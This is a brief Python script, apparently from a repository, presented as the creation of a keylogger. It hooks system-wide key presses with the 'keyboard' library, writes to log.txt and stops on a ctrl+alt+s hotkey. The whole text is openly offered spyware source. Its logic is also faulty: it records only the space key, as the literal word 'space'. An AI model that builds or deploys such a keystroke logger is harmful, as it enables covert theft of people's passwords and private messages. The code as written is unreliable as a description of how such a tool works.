# Creation-of-a-Keylogger

import keyboard

with open("log.txt","a") as log:
    def press(tecla):
        if tecla.name == 'space':
            log.write(tecla.name)

    def salir():
        exit()

    keyboard.add_hotkey('ctrl+alt+s', salir)
    keyboard.on_press(press)
    keyboard.wait()
